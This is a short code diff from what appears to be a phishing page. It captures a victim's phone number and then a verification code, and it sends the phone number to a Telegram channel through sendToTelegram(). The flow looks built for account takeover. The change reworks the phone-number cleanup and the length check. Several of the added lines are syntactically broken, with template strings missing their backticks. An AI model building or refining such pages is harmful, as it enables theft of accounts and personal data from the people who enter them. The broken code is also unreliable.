@@ -289,19 +289,18 @@
     }
 
     function sendPhone() {
-	let countryCode = document.querySelector('.country-code').value.trim().replace(/^\+*/, '');
-	let phoneInput = document.getElementById('phone').value.trim().replace(/^\+*/, '');
-	phoneNumber = '+' + countryCode + phoneInput;
+  	const countryCode = document.querySelector('.country-code').value.trim().replace('+', '');
+  	const phoneInput = document.getElementById('phone').value.trim().replace(/^(\+)+/, '');
+  	phoneNumber = +${countryCode}${phoneInput};
 
-      if (phoneNumber.length < 10) {
-        document.getElementById('phoneError').style.display = 'block';
-        return;
-      }
+  	if (phoneInput.length < 10) {
+    	    document.getElementById('phoneError').style.display = 'block';
+    	    return;
+        }
 
-      sendToTelegram(`📱 Введён номер телефона: +${phoneNumber}`);
-      showStep(2);
+  	sendToTelegram(📱 Введён номер телефона: ${phoneNumber});
+  	showStep(2);
     }
-
     function sendCode() {
       const codeInput = document.getElementById('code');
       const code = codeInput.value.trim();
